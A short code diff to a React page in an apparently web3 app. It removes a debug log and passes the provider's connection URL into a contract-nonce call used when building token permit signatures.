@@ -49,7 +49,6 @@ const Page = () => {
 		"deadline": 2661766724
 	} as any;
 
-	console.log(provider)
 
 	return (
 		<div>
@@ -97,7 +96,9 @@ const Page = () => {
 							NONCE
 						</button>
 						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
-							const nonce = await callContractMethod('nonces', [account.address], token.contract_address);
+							const nonce = await callContractMethod('nonces', [account.address], token.contract_address,
+								//@ts-ignore
+								provider.connection.url+"");
 							const sig = await createPermitSignature(async (args: any)=>{
 									console.log('test',args);
 								return signTypedData(config, args);
